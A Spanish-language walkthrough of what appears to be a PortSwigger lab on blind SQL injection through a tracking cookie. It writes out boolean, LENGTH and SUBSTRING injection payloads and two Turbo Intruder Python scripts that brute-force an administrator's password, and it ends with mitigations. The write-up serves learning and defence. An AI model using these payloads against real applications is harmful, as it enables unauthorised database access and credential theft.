---
title: "Inyección SQL ciega con respuestas condicionales"
platform: "PortSwigger"
os: "Linux"
difficulty: "Insane"
ip: "10.10.10.XXX"
slug: "inyeccion-sql-ciega-con-respuestas-condicionales"
author: "Z4k7"
date: "2026-03-12"
year: "2026"
status: "pwned"
tags:
  - "SQLi"
  - "UnionAttack"
  - "BlindSQLi"
  - "cookie"
  - "password"
techniques:
  - "SQLi"
  - "UnionAttack"
  - "BlindSQLi"
  - "cookie"
  - "password"
tools:
  - "Burpsuite"
  - "Turbo-Intruder"
  - "Python"
flags_list:
  - label: "usuario"
    value: "administrator"
  - label: "password"
    value: "szo4ajhcyhdya4tejwsy"
summary: "La SQL Injection ciega basada en respuestas condicionales ocurre cuando una aplicación web ejecuta consultas SQL con datos controlados por el usuario, pero no devuelve directamente los resultados ni errores. En su lugar, el atacante infiere la validez de las consultas a través de cambios en la respuesta de la aplicación (ej. mensajes condicionales como _Welcome back!_).   Esta vulnerabilidad existe por falta de validación y parametrización en las consultas SQL,  permitiendo que valores en cookies o parámetros manipulen la lógica interna de la base de  datos."
steps:

  - id: "exploit"
    num: "01"
    title: "Objetivo"
    content:
      - kind: "note"
        text: |
          Este laboratorio contiene una vulnerabilidad de inyección SQL ciega. La aplicación utiliza una #cookie de seguimiento para análisis y realiza una consulta SQL que contiene el valor de la cookie enviada.
          No se devuelven los resultados de la consulta SQL ni se muestran mensajes de error. Sin embargo, la aplicación incluye un `Welcome back`Mensaje en la página si la consulta devuelve alguna fila.
          La base de datos contiene una tabla diferente llamada `users`, con columnas llamadas `username` y `password`. Debes explotar la vulnerabilidad de inyección SQL ciega para averiguar la contraseña del `administrator`usuario.
          Para resolver el laboratorio, inicie sesión como `administrator`usuario..
      - kind: "callout"
        type: "warning"
        label: "Pista"
        text: "Puede asumir que la contraseña solo contiene caracteres alfanuméricos en minúscula."

  - id: "recon"
    num: "02"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Ingresamos en el laboratorio e identificamos la cookie por medio de burpsuite
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312102736548.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Podemos validar que contamos con el TrackingId que nos permite dar la respuesta de WELCOM BACK
          Considere una aplicación que utiliza cookies de seguimiento para recopilar datos de uso. Las solicitudes a la aplicación incluyen un encabezado de cookie como este:
          `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
          Cuando una solicitud que contiene un `TrackingId`Se procesa la cookie, la aplicación utiliza una consulta SQL para determinar si se trata de un usuario conocido:
          a validar dicha información es como estar realizando una consulta a la BD enviando una solicitud de la siguiente manera
      - kind: "code"
        lang: "SQL"
        code: |
          SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
      - kind: "note"
        text: |
          En este caso como se realiza un inyección  a siegas no podemos recibir errores de la consulta la única opción que nos brinda como ejemplo es al momento del usuario estar  logiado nos brinda un código o mensaje de bienvenido
          Para entender cómo funciona este exploit, supongamos que se envían dos solicitudes que contienen lo siguiente `TrackingId`Valores de las cookies a su vez:
          `…xyz' AND '1'='1 …xyz' AND '1'='2`
      - kind: "bullet"
        text: "El primero de estos valores hace que la consulta devuelva resultados, porque el valor inyectado AND '1'='1La condición es verdadera. Como resultado, se muestra el mensaje 'Bienvenido de nuevo'."
      - kind: "bullet"
        text: "El segundo valor hace que la consulta no devuelva ningún resultado, porque la condición inyectada es falsa. El mensaje de 'Bienvenido de nuevo' no aparece. desplegado."
      - kind: "note"
        text: |
          Por ejemplo, supongamos que hay una tabla llamada `Users`con las columnas `Username` y `Password`, y un usuario llamado `Administrator`Puede determinar la contraseña de este usuario enviando una serie de entradas para probar la contraseña un carácter a la vez.
          Para ello, comience con la siguiente entrada:
      - kind: "code"
        lang: "SQL"
        code: |
          xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
      - kind: "note"
        text: |
          al validar que la posible letra de ingresada es verdadera nos envía el mensaje de bienvenido en el caso que la letra fuera equivocada el estado de bienvenida se omite

  - id: "exploit"
    num: "03"
    title: "Explotación"
    content:
      - kind: "note"
        text: |
          Si validamos las siguientes consultas
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+'1'='1'--  --con mensaje 
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+'1'='2'--  --sin mensaje
      - kind: "note"
        text: |
          Con esto validamos la vulnerabilidad  tratamos de obtener  el password del usuario admin
          Enviamos el siguientes condición para confirmar si contamos con la tabla  llamada   `users`
      - kind: "callout"
        type: "info"
        label: "Explicacion"
        text: "Si la tabla  `users` existe y tiene al menos una fila, la subconsulta devuelve `'a'`  y la comparación `'a'='a'`  resulta verdadera.  Esto confirma para el atacante que la tabla existe y es accesible, sin necesidad de extraer todavía información sensible."
      - kind: "note"
        text: |
          En este caso ya confirmamos que contamos con una tabla llamada   `users`
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312102954570.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Enviamos el siguientes condición para confirmar si contamos con un  llamada   `administrator`
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND(SELECT+'a'+FROM+users+WHERE+username='administrator')='a'--;
      - kind: "callout"
        type: "info"
        label: "Explicacion"
        text: "Ya contamos con el nombre de la tabla llamada `users` vamos a realizar una consulta simple para confirmar si contamos con un usuario en esa tabla llamado  `administrator`  como es correcto confirmamos la misma validación anterior."
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103038909.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ya contamos con la tabla y sabemos que el usuario existe debemos validar ahora  el password del usuario pero primero debemos saber la cantidad de dejitos de la misma
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a'--
      - kind: "note"
        text: |
          Con lo anterior validamos si  la comparación para ver la cantidad de caracteres del password si supera la cantidad no se mostrara el mensaje de welcom
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103104290.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Validando por medio de intuder se calcula un valor de casi 20 caracteres en el #password
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103250149.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Podemos realizar la validación con turbo intuder con el siguiente código  donde  validar la cantidad de caracteres que maneja el password.
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=5,
                                     requestsPerConnection=100,
                                     pipeline=False)
          
              for word in open('C:\\Users\\Public\\abc.txt'):
                  engine.queue(target.req, word.rstrip())
          
          def handleResponse(req, interesting):
              # 1. Buscamos el inicio de la sección .top-links
              # Buscamos la etiqueta que contiene el "Welcome back!"
              start_tag = '<section class="top-links">'
              end_tag = '</section>'
              
              if start_tag in req.response:
                  # Extraemos el fragmento de HTML del header
                  content = req.response.split(start_tag)[1].split(end_tag)[0]
                  
                  # 2. Ahora buscamos específicamente el <div>Welcome back!</div>
                  if '<div>' in content:
                      welcome_text = content.split('<div>')[1].split('</div>')[0]
                      
                      # 3. Añadimos una columna personalizada a la tabla de Turbo Intruder
                      # Esto mostrará el texto "Welcome back!" en la interfaz de Burp
                      req.label = welcome_text
                      table.add(req)
              
              # Si no encuentra el texto pero la respuesta no es 404, agrégalo igual
              elif req.status != 404:
                  table.add(req)
      - kind: "note"
        text: |
          El anterior código nos permite  validar la longitud del password :
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103336493.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Ya contamos con la dimensión del password ya nos queda validar carácter por carácter para confirmar el password del usuario
          Vamos a validar  o saber cual es el password del usuario esto lo podemos determinar realizando una comparación como se a realizado con anterioridad pero por medio de `SUBSTRING`
      - kind: "code"
        lang: "SQL"
        code: |
          TrackingId=ZOJsKxwcUk6uwuo0'+AND+(SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username='administrator')='a'--;
      - kind: "note"
        text: |
          Código para turbo intruder
      - kind: "code"
        lang: "PYTHON"
        code: |
          def queueRequests(target, wordlists):
              engine = RequestEngine(endpoint=target.endpoint,
                                     concurrentConnections=1,
                                     requestsPerConnection=100,
                                     pipeline=False)
          
              for numero in range(0, 20):
                  
                  # 2. Por cada número, abrimos y recorremos el diccionario abc.txt
                  # Es importante abrirlo dentro para que el puntero se reinicie
                  with open('C:\\Users\\Public\\abc.txt') as f:
                      for word in f:
                          word = word.rstrip()
                          
                          # 3. Enviamos ambos valores como una lista
                          # Tu solicitud (target.req) DEBE tener dos marcadores %s
                          engine.queue(target.req, [str(numero), word])
          
          def handleResponse(req, interesting):
              # 1. Buscamos el inicio de la sección .top-links
              # Buscamos la etiqueta que contiene el "Welcome back!"
              start_tag = '<section class="top-links">'
              end_tag = '</section>'
              
              if start_tag in req.response:
                  # Extraemos el fragmento de HTML del header
                  content = req.response.split(start_tag)[1].split(end_tag)[0]
                  
                  # 2. Ahora buscamos específicamente el <div>Welcome back!</div>
                  if '<div>' in content:
                      welcome_text = content.split('<div>')[1].split('</div>')[0]
                      
                      # 3. Añadimos una columna personalizada a la tabla de Turbo Intruder
                      # Esto mostrará el texto "Welcome back!" en la interfaz de Burp
                      req.label = welcome_text
                      table.add(req)
              
              # Si no encuentra el texto pero la respuesta no es 404, agrégalo igual
              elif req.status != 404:
                  table.add(req)
      - kind: "note"
        text: |
          Podemos validar que tenemos el password
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103421965.jpg"
        caption: "Evidencia técnica"

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "usuario"
        value: "administrator"
      - label: "password"
        value: "szo4ajhcyhdya4tejwsy"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          validamos y contamos con el acceso
      - kind: "image"
        src: "assets/images/Inyección%20SQL%20ciega%20con%20respuestas%20condicionales/file-20260312103727177.jpg"
        caption: "Evidencia técnica"

lessons:
  - 'En auditorías, siempre validar primero la existencia de tablas y usuarios antes de intentar extracción de datos sensibles.'
  - 'En exámenes o entrevistas, destacar la diferencia entre SQLi clásica (con errores visibles) y SQLi ciega (basada en inferencias).'
  - 'Recordar que la explotación se basa en respuestas booleanas y que la defensa más sólida es la parametrización.'
mitigation:
  - 'Implementar consultas parametrizadas (Prepared Statements).'
  - 'Evitar concatenación de valores de cookies en SQL.'
  - 'Monitorear patrones de requests repetitivos (detección de brute-force).'
  - 'Configurar WAF para bloquear payloads comunes de SQLi.'
  - 'Revisar logs de aplicación para detectar anomalías en cookies.'
---
